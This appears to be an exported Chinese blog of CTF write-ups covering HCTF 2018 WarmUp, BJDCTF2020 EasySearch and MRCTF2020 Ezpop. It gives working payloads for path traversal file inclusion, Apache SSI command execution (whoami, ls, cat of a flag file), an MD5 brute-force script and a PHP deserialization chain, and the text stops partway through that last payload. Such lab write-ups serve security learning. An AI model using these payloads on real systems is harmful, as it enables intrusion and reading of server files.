<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;$page</span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $whitelist = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            $_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            $_page = urldecode($page);<br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>代码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>

<p> 高亮显示文件函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;$page</span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $whitelist = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br></code></pre></td></tr></table></figure>

<p>checkfile函数里（），提示我们source.php和hint.php</p>
<p>访问hint.php得到语句：</p>
<p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p>
<p>将传递的参数赋值给page，然后判断若page变量不存在或非字符串</p>
<p>则echo  “you can’t see it”</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;$_page = mb_substr(<br>    $page,<br>    <span class="hljs-number">0</span>,<br>    mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>);<br><span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>若变量page存在于whitelist数组中</p>
<p>则返回true</p>
<p>以下看几个php函数：</p>
<p>php in_array函数</p>
<p>定义和用法：</p>
<p>in_array()函数搜索数组中是否存在指定的值</p>
<p><strong>注释：</strong>如果search参数是字符串并且设置为true，则搜索区分大小写</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">in</span><span class="hljs-constructor">_array(<span class="hljs-params">search</span>,<span class="hljs-params">array</span>,<span class="hljs-params">type</span>)</span><br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>search</em></td>
<td align="left">必需。规定要在数组搜索的值。</td>
</tr>
<tr>
<td align="left"><em>array</em></td>
<td align="left">必需。规定要搜索的数组。</td>
</tr>
<tr>
<td align="left"><em>type</em></td>
<td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td>
</tr>
</tbody></table>
<p>php mb_substr()函数</p>
<p>mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</p>
<p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit">mb_substr ( <span class="hljs-built_in">string</span> $str , <span class="hljs-built_in">int</span> $start [, <span class="hljs-built_in">int</span> $length = <span class="hljs-literal">NULL</span> [, <span class="hljs-built_in">string</span> $encoding = mb_internal_encoding() ]] ) : <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>str</em></td>
<td align="left">必需。从该 string 中提取子字符串。</td>
</tr>
<tr>
<td align="left"><em>start</em></td>
<td align="left">必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始</td>
</tr>
<tr>
<td align="left"><em>length</em></td>
<td align="left">可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回</td>
</tr>
<tr>
<td align="left">encoding</td>
<td align="left">可选。字符编码。如果省略，则使用内部字符编码。</td>
</tr>
</tbody></table>
<p>php mb_strpos函数</p>
<p>定义和用法：</p>
<p>查找字符串在另一个字符串首次出现的位置</p>
<p>基于字符数执行一个多字节安全的strpos()操作，第一个字符的位置是0，第二个字符的位置是1，依次类推</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><code class="hljs delphi">strpos<span class="hljs-comment">(*string,find,start*)</span><br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>string</em></td>
<td align="left">必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td align="left"><em>find</em></td>
<td align="left">必需。规定要查找的字符。</td>
</tr>
<tr>
<td align="left"><em>start</em></td>
<td align="left">可选。规定开始搜索的位置。</td>
</tr>
</tbody></table>
<p>我们大概就可以知道了，这段代码表示截取$page中’?’前部分，若无则截取整个$page</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$_page = urldecode($page);<br></code></pre></td></tr></table></figure>

<p>这里是对page进行url解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>这里首先判断$_REQUEST[‘file’]值非空</p>
<p>第二判断是否为字符串</p>
<p>再就是能否通过checkfile（）函数校验</p>
<p>后面是包含$_REQUEST[‘file’]文件</p>
<p>如果条件不满足就打印滑稽表情</p>
<p>结论：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>第一个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句对变量进行检验，要求<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>为字符串，否则返回<span class="hljs-literal">false</span><br><span class="hljs-number">2.</span>第二个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句判断<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>是否存在于<span class="hljs-string">``</span><span class="hljs-symbol">$w</span>hitelist<span class="hljs-string">``</span>数组中，存在则返回<span class="hljs-literal">true</span><br><span class="hljs-number">3.</span>第三个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句判断截取后的<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>是否存在于<span class="hljs-string">``</span><span class="hljs-symbol">$w</span>hitelist<span class="hljs-string">``</span>数组中，截取<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>中<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>前部分，存在则返回<span class="hljs-literal">true</span><br><span class="hljs-number">4.</span>第四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句判断url解码并截取后的<span class="hljs-string">``</span><span class="hljs-symbol">$page</span><span class="hljs-string">``</span>是否存在于<span class="hljs-string">``</span><span class="hljs-symbol">$w</span>hitelist<span class="hljs-string">``</span>中，存在则返回<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>

<figure class="highlight qml"><table><tr><td class="code"><pre><code class="hljs qml">若以上四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句均未返回值，则返回<span class="hljs-literal">false</span><br>有三个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句可以返回<span class="hljs-literal">true</span>，第二个语句直接判断<span class="hljs-string">``</span>$page<span class="hljs-string">``</span>，不可用<br>第三个语句截取<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句中，先进行<span class="hljs-built_in">url</span>解码再截取，因此我们可以将?经过两次<span class="hljs-built_in">url</span>编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>，仍可通过第四个<span class="hljs-string">``</span><span class="hljs-keyword">if</span><span class="hljs-string">``</span>语句校验。（<span class="hljs-string">``</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">``</span>两次编码值为<span class="hljs-string">``</span><span class="hljs-string">&#x27;%253f&#x27;</span><span class="hljs-string">``</span>）,构造<span class="hljs-built_in">url</span>：<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=hint.php%<span class="hljs-number">253</span>F..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php%<span class="hljs-number">253</span>F..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>

<p>hint.php和source.php都是白名单里文件</p>
<p>因为我们不知道ffffllllaaaagggg文件存放的具体位置<br>所以可以依次增加   ../</p>
<p>最后拿到flag</p>
<p><img src="/2021/08/29/2021/buu/15/image-20210829101454490.png" alt="image-20210829101454490"></p>
<p>借鉴于：</p>
<p>[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <url>/2021/09/02/2021/buu/18/</url>
    <content><![CDATA[<p> 参考博客：</p>
<p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p>
<p>打开后只有一个输入框</p>
<p>尝试了一下sql注入</p>
<p>只会出现一样的弹框</p>
<p><img src="/2021/09/02/2021/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p>
<p>扫描目录后发现还有swp文件</p>
<p>访问得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>	ob_start();<br>	function get_hash()&#123;<br>		$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;<br>		$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times<br>		$content &#x3D; uniqid().$random;<br>		return sha1($content); <br>	&#125;<br>    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);<br>	***<br>    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )<br>    &#123;<br>        $admin &#x3D; &#39;6d0bc1&#39;;<br>        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;<br>            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;<br>            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;<br>            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);<br>            $text &#x3D; &#39;<br>            ***<br>            ***<br>            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;<br>            ***<br>			***&#39;;<br>            fwrite($shtml,$text);<br>            fclose($shtml);<br>            ***<br>			echo &quot;[!] Header  error ...&quot;;<br>        &#125; else &#123;<br>            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;<br>            <br>    &#125;else<br>    &#123;<br>	***<br>    &#125;<br>	***<br>?&gt;<br></code></pre></td></tr></table></figure>

<p>映入眼帘的就是hash函数</p>
<p>注意到登陆代码</p>
<p><img src="/2021/09/02/2021/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p>
<p>​        解释起来，就是password必须hash加密后要等于6d0bc1，满足后就会输出script弹窗 </p>
<p>‘Welcome to manage system’</p>
<p><img src="/2021/09/02/2021/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p>
<p>登录成功后会生成相应的shtml文件</p>
<p>开始解题</p>
<p>先得到脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs php+HTML"># -*- coding: utf-8 -*-<br>import hashlib<br>import threading<br>string &#x3D; &#39;0123456789&#39;<br>class BF(threading.Thread):<br>    def __init__(self,left,right):<br>        threading.Thread.__init__(self) #父类的构造方法<br>        self.left &#x3D; left<br>        self.right &#x3D; right<br>    def run(self):<br>        admin &#x3D; &#39;6d0bc1&#39;<br>        for i in range(self.left,self.right):<br>            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()<br>            if s[:6] &#x3D;&#x3D; admin:<br>                print i<br>threads &#x3D; []<br>thread_count &#x3D; 5<br>for i in range(thread_count):<br>    threads.append(BF(i*2000000, (i+1)*2000000))<br>for t in threads:<br>    t.start()<br>for t in threads:<br>    t.join()<br><br></code></pre></td></tr></table></figure>

<p>跑完后：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">\<span class="hljs-meta">#2020666</span><br>\<span class="hljs-meta">#2305004</span><br>\<span class="hljs-meta">#9162671</span><br></code></pre></td></tr></table></figure>

<p>选择其中一个密码登录</p>
<p>然后查看网络状态</p>
<p><img src="/2021/09/02/2021/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p>
<p>用这里的路径访问下</p>
<p><img src="/2021/09/02/2021/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p>
<p>看wp知道了后面用ssti模板注入</p>
<p>这里有一个知识点</p>
<p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p>
<p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p>
<p><img src="/2021/09/02/2021/buu/18/image-20211028185301599.png" alt="image-20211028185301599"></p>
<!--#exec cmd="whoami"-->

<p><img src="/2021/09/02/2021/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p>
<!--#exec cmd="ls"-->

<p><img src="/2021/09/02/2021/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p>
<!--#exec cmd="ls ../"-->  #看一下上层目录

<p><img src="/2021/09/02/2021/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p>
<p>找到了</p>
<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->

<p><img src="/2021/09/02/2021/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <url>/2021/09/03/2021/buu/19/</url>
    <content><![CDATA[<h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p>借鉴博客</p>
<p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpop—序列化pop链_marsxu626的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p>
<p>这题是代码审计和反序类化中的绕过，如何构造pop链是最终目的</p>
<p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">Welcome to index.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    $a=<span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接下来分而解析几个不同的类</p>
<p>1.Modifier类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<span class="hljs-comment">//variable，变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个我在把文件放进seay审计系统里跑的时候就跑出了</p>
<p>include文件包含漏洞，而这也是我们最后要达成的目的：</p>
<p>利用文件包含漏洞和php伪协议来读取flag文件</p>
<p>但是并没有那么简单，因为对于上传内容会进行反序类化，改变了值</p>
<p>所以我们得想办法绕过</p>
<p>这里还有魔术方法<strong>__invoke</strong> ，当脚本尝试将对象调用为函数时触发，所以在脚本中要把Modifier类调用为函数，这样最后赋值到var上。</p>
<p>2.Show类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>注意到了这里的_wakeup()函数，在反序列化时一定会首先调用其函数，过滤了不老少关键字，但是像filter://伪协议却没有过滤。</p>
<p>而_toString把类当作字符串时触发</p>
<p>所以得出wakeup方法可以触发tostring方法</p>
<p>3.Test类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里有魔术方法：<strong>__get</strong> 从不可访问的属性中读取数据会触发<br>会返回function作为函数调用。</p>
<p>思路得出：</p>
<p>​        首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php</p>
<p>payload1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span 